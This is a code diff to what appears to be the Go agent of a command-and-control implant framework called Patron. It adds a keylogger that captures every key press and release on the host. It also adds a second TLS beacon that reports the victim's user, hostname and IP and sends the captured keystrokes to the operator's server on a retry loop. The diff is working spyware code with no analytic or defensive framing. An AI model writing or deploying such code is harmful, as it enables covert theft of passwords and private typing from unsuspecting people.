@@ -14,6 +14,7 @@ import (
 
 	"github.com/google/uuid"
 
+	"github.com/MarinX/keylogger"
 	"github.com/PatronC2/Patron/types"
 	"github.com/s-christian/gollehs/lib/logger"
 )
@@ -57,6 +58,42 @@ func main() {
 		log.Fatal("failed to parse root certificate")
 	}
 	config := &tls.Config{RootCAs: roots, InsecureSkipVerify: true}
+
+	//Keylog start
+	// find keyboard device, does not require a root permission
+	keyboard := keylogger.FindKeyboardDevice()
+	cache := "" // cache for keylogs
+	k, err := keylogger.New(keyboard)
+	if err != nil {
+		log.Fatalln(err)
+		return
+	}
+	defer k.Close()
+
+	events := k.Read()
+
+	go func() {
+		// range of events
+		for e := range events {
+			switch e.Type {
+			case keylogger.EvKey:
+
+				// if the state of key is pressed
+				if e.KeyPress() {
+					// fmt.Println("[event] press key ", e.KeyString())
+					cache = cache + e.KeyString()
+				}
+
+				// if the state of key is released
+				if e.KeyRelease() {
+					// fmt.Println("[event] release key ", e.KeyString())
+					cache = cache + e.KeyString()
+				}
+
+				break
+			}
+		}
+	}()
 
 	Agentuuid := uuid.New().String()                         // Agent's uuid generated
 	hostname, err := exec.Command("hostname", "-f").Output() // Agent's hostname
@@ -146,6 +183,44 @@ func main() {
 		logger.Logf(logger.Debug, "Sent encoded struct\n")
 		beacon.Close()
 		intVar, err := strconv.Atoi(CallbackFrequency)  // apply CallbackFrequency
+		time.Sleep(time.Second * time.Duration(intVar)) // interval and jitter here
+
+		//Second beacon for keylog dump
+	KEYRETRY:
+		keybeacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
+		if err != nil {
+			// log.Fatalln(err) // maybe try diff IP
+			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
+			goto KEYRETRY
+		}
+		keyipAddress := keybeacon.LocalAddr().(*net.TCPAddr)
+		keyip := fmt.Sprintf("%v", keyipAddress)
+		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip + ":KeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter + ":MASTERKEY"
+		// logger.Logf(logger.Debug, "Sending : %s\n", init)
+		_, _ = keybeacon.Write([]byte(keyinit + "\n"))
+		keydec := gob.NewDecoder(keybeacon)
+		keyencoder := gob.NewEncoder(keybeacon)
+		logger.Logf(logger.Info, "Server Connected\n")
+		keyinstruct := &types.KeySend{}
+		logger.Logf(logger.Debug, "Struct formed\n")
+		err = keydec.Decode(keyinstruct)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		logger.Logf(logger.Debug, "Received : %s\n", keyinstruct)
+		Keydestruct := types.KeyReceive{}
+		Keydestruct = types.KeyReceive{
+			Uuid: keyinstruct.Uuid,
+			Keys: cache,
+		}
+		cache = "" //Clears cache after keylog dump
+
+		err = keyencoder.Encode(Keydestruct)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		logger.Logf(logger.Debug, "Sent encoded struct\n")
+		keybeacon.Close()
 		time.Sleep(time.Second * time.Duration(intVar)) // interval and jitter here
 	}
 
